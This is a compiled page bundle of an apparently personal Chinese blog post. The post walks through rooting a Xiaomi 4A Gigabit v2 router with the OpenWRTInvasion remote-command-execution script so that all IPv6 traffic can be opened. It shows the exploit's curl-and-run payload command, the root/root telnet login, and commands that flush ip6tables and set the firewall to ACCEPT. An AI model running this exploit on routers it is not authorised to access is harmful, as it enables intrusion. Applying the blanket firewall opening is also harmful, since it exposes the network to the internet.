import{_ as i,c as p,b as n,a,d as e,e as t,r,o as c}from"./app-CUDFWA7u.js";const o="/blog/assets/image-20250608220943742-DpKqtJOJ.png",d="/blog/assets/image-20250608221044742-CwipKOeD.png",v={},u={href:"https://github.com/LordPinhead/OpenWRTInvasion",target:"_blank",rel:"noopener noreferrer"};function $(m,s){const l=r("ExternalLinkIcon");return c(),p("div",null,[s[2]||(s[2]=n('<h2 id="小米路由器-4a-千兆版v2-r4ag-v2-放通所有-ipv6-流量" tabindex="-1"><a class="header-anchor" href="#小米路由器-4a-千兆版v2-r4ag-v2-放通所有-ipv6-流量"><span>小米路由器 4A 千兆版v2 (r4ag v2) 放通所有 IPv6 流量</span></a></h2><p><strong>适用于</strong></p><p>型号：小米路由器 4A 千兆版v2 (r4ag v2)</p><p>系统版本: 2.30.500</p><h3 id="下载漏洞脚本" tabindex="-1"><a class="header-anchor" href="#下载漏洞脚本"><span>下载漏洞脚本</span></a></h3><p>注意必须要用这个，其他同名项目也不行</p><blockquote><p>没空看源代码，也懒得看区别在在哪里了。</p></blockquote>',7)),a("p",null,[s[1]||(s[1]=e("GitHub： ")),a("a",u,[s[0]||(s[0]=e("LordPinhead/OpenWRTInvasion")),t(l)])]),s[3]||(s[3]=n('<p>备用下载：https://wwjt.lanzouu.com/ixMDO2yd61re</p><h3 id="解锁-telnet" tabindex="-1"><a class="header-anchor" href="#解锁-telnet"><span>解锁 Telnet</span></a></h3><p>解压并打开项目</p><p>打开 <code>remote_command_execution_vulnerability.py</code>，把 Windows 检测的两行代码直接注释掉</p><p><img src="'+o+'" alt="image-20250608220943742"></p><p>找到变量 <code>router_password</code> 改成目前路由器的管理密码</p><p><img src="'+d+`" alt="image-20250608221044742"></p><p>安装依赖并运行脚本</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre><code><span class="line">pip3 install <span class="token operator">-</span>r requirements<span class="token punctuation">.</span>txt <span class="token comment"># Install requirements</span></span>
<span class="line">python3 remote_command_execution_vulnerability<span class="token punctuation">.</span>py <span class="token comment"># Run the script</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>运行后一直回车即可</p><blockquote><p>如果运行的时候卡在 <code>stopping local file server</code>，就是失败了，关掉重新运行。</p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">Router IP address <span class="token punctuation">[</span>press enter <span class="token keyword">for</span> using the default <span class="token string">&#39;192.168.31.1&#39;</span><span class="token punctuation">]</span>: </span>
<span class="line">Local Host IP address <span class="token punctuation">[</span>press enter <span class="token keyword">for</span> using the default <span class="token string">&#39;192.168.31.2&#39;</span><span class="token punctuation">]</span>: </span>
<span class="line">Enter router admin password: <span class="token string">&#39;12345678&#39;</span><span class="token punctuation">]</span>: </span>
<span class="line">****************</span>
<span class="line">router_ip_address: <span class="token number">192.168</span>.31.1       </span>
<span class="line">stok: xxxxxxxxxxxxxxxxxxxxxxxxx</span>
<span class="line">****************</span>
<span class="line"><span class="token builtin class-name">local</span> <span class="token function">file</span> server is runing on <span class="token number">0.0</span>.0.0:50285. <span class="token assign-left variable">root</span><span class="token operator">=</span><span class="token string">&#39;build&#39;</span></span>
<span class="line">start uploading payload file<span class="token punctuation">..</span>.</span>
<span class="line">exploit url: <span class="token builtin class-name">cd</span> /tmp <span class="token operator">&amp;&amp;</span> <span class="token function">curl</span> <span class="token parameter variable">-s</span> http://192.168.31.2:50285/build/payload.tar.gz <span class="token operator">&gt;</span> payload.tar.gz <span class="token operator">&amp;&amp;</span> <span class="token function">curl</span> <span class="token parameter variable">-s</span> http://192.168.31.2:50285/bootstrapper_v2.sh <span class="token operator">&gt;</span> bootstrapper.sh <span class="token operator">&amp;&amp;</span> /bin/ash /tmp/bootstrapper.sh</span>
<span class="line">exploit_code: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>
<span class="line">exploit_url: xxxxxxxxxxxxxxxxxxxxxxxxxxx</span>
<span class="line"><span class="token punctuation">{</span><span class="token string">&quot;code&quot;</span>:0<span class="token punctuation">}</span></span>
<span class="line">stopping <span class="token builtin class-name">local</span> <span class="token function">file</span> server</span>
<span class="line">done<span class="token operator">!</span> Now you can connect to the router using several options: <span class="token punctuation">(</span>user: root, password: root<span class="token punctuation">)</span></span>
<span class="line">* telnet <span class="token number">192.168</span>.31.1</span>
<span class="line">* <span class="token function">ssh</span> <span class="token parameter variable">-oKexAlgorithms</span><span class="token operator">=</span>+diffie-hellman-group1-sha1 <span class="token parameter variable">-c</span> 3des-cbc <span class="token parameter variable">-o</span> <span class="token assign-left variable">UserKnownHostsFile</span><span class="token operator">=</span>/dev/null root@192.168.31.1</span>
<span class="line">* ftp: using a program like cyberduck</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行完成后，就可以 Telnet 上路由器了</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">XiaoQiang login: root</span>
<span class="line">Password: root</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">BusyBox v1.25.1 (2023-02-07 05:46:32 UTC) built-in shell (ash)</span>
<span class="line"></span>
<span class="line"> -----------------------------------------------------</span>
<span class="line">       Welcome to XiaoQiang!</span>
<span class="line"> -----------------------------------------------------</span>
<span class="line">  $$$$$$\\  $$$$$$$\\  $$$$$$$$\\      $$\\      $$\\        $$$$$$\\  $$\\   $$\\</span>
<span class="line"> $$  __$$\\ $$  __$$\\ $$  _____|     $$ |     $$ |      $$  __$$\\ $$ | $$  |</span>
<span class="line"> $$ /  $$ |$$ |  $$ |$$ |           $$ |     $$ |      $$ /  $$ |$$ |$$  /</span>
<span class="line"> $$$$$$$$ |$$$$$$$  |$$$$$\\         $$ |     $$ |      $$ |  $$ |$$$$$  /</span>
<span class="line"> $$  __$$ |$$  __$$&lt; $$  __|        $$ |     $$ |      $$ |  $$ |$$  $$&lt;</span>
<span class="line"> $$ |  $$ |$$ |  $$ |$$ |           $$ |     $$ |      $$ |  $$ |$$ |\\$$\\</span>
<span class="line"> $$ |  $$ |$$ |  $$ |$$$$$$$$\\       $$$$$$$$$  |       $$$$$$  |$$ | \\$$\\</span>
<span class="line"> \\__|  \\__|\\__|  \\__|\\________|      \\_________/        \\______/ \\__|  \\__|</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">root@XiaoQiang:~# </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="ip6table-放行-ipv6-流量" tabindex="-1"><a class="header-anchor" href="#ip6table-放行-ipv6-流量"><span>ip6table 放行 IPv6 流量</span></a></h3><p>临时放行（用于测试是否为路由器防火墙引起的问题）</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">ip6tables <span class="token parameter variable">-F</span></span>
<span class="line">ip6tables <span class="token parameter variable">-X</span></span>
<span class="line">ip6tables <span class="token parameter variable">-P</span> INPUT ACCEPT</span>
<span class="line">ip6tables <span class="token parameter variable">-P</span> OUTPUT ACCEPT</span>
<span class="line">ip6tables <span class="token parameter variable">-P</span> FORWARD ACCEPT</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>永久放行：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line"><span class="token comment"># 设置 INPUT 策略为 ACCEPT</span></span>
<span class="line">uci <span class="token builtin class-name">set</span> firewall.@zone<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>.input<span class="token operator">=</span><span class="token string">&#39;ACCEPT&#39;</span></span>
<span class="line"></span>
<span class="line"><span class="token comment"># 设置 FORWARD 策略为 ACCEPT</span></span>
<span class="line">uci <span class="token builtin class-name">set</span> firewall.@zone<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>.forward<span class="token operator">=</span><span class="token string">&#39;ACCEPT&#39;</span></span>
<span class="line"></span>
<span class="line"><span class="token comment"># 保存到配置文件</span></span>
<span class="line">uci commit firewall    </span>
<span class="line"></span>
<span class="line"><span class="token comment"># 重启防火墙</span></span>
<span class="line">/etc/init.d/firewall restart  </span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查看 ip6tables</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">ip6tables <span class="token parameter variable">-L</span> <span class="token parameter variable">-n</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>重启系统验证</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line"><span class="token function">reboot</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>重启后从公网再访问一下，确认没问题，就是 OK 了。</p>`,24))])}const x=i(v,[["render",$]]),h=JSON.parse('{"path":"/blogs/tech/networking/shared/01_Xiaomi_4A_GE_v2_ipv6.html","title":"小米路由器 4A 千兆版v2 (r4ag v2) 放通所有 IPv6 流量","lang":"en-US","frontmatter":{"title":"小米路由器 4A 千兆版v2 (r4ag v2) 放通所有 IPv6 流量","date":"2025-05-11T00:00:00.000Z","tags":["Networking","Tech-Talks"],"categories":["tech"]},"headers":[{"level":2,"title":"小米路由器 4A 千兆版v2 (r4ag v2) 放通所有 IPv6 流量","slug":"小米路由器-4a-千兆版v2-r4ag-v2-放通所有-ipv6-流量","link":"#小米路由器-4a-千兆版v2-r4ag-v2-放通所有-ipv6-流量","children":[{"level":3,"title":"下载漏洞脚本","slug":"下载漏洞脚本","link":"#下载漏洞脚本","children":[]},{"level":3,"title":"解锁 Telnet","slug":"解锁-telnet","link":"#解锁-telnet","children":[]},{"level":3,"title":"ip6table 放行 IPv6 流量","slug":"ip6table-放行-ipv6-流量","link":"#ip6table-放行-ipv6-流量","children":[]}]}],"git":{"createdTime":1751287789000,"updatedTime":1766890838000,"contributors":[{"name":"PPPerryPan","email":"perrypan0123@outlook.com","commits":2}]},"filePathRelative":"blogs/tech/networking/shared/01_Xiaomi_4A_GE_v2_ipv6.md"}');export{x as comp,h as data};
